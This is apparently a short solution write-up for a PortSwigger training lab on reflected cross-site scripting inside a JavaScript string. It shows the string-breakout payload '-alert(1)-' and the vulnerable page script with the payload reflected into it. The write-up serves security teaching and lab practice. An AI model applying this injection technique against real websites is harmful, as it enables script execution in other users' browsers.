# Portswigger - Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

## Description
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

## Solution
* send payload to search box observe that angle brackets are encoded, so "<>" will not trigger popup
* Payload
```html
'-alert(1)-'
```

## vulnerable code
```javascript
<script>
    var searchTerms = ''-alert(1)-'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>   
```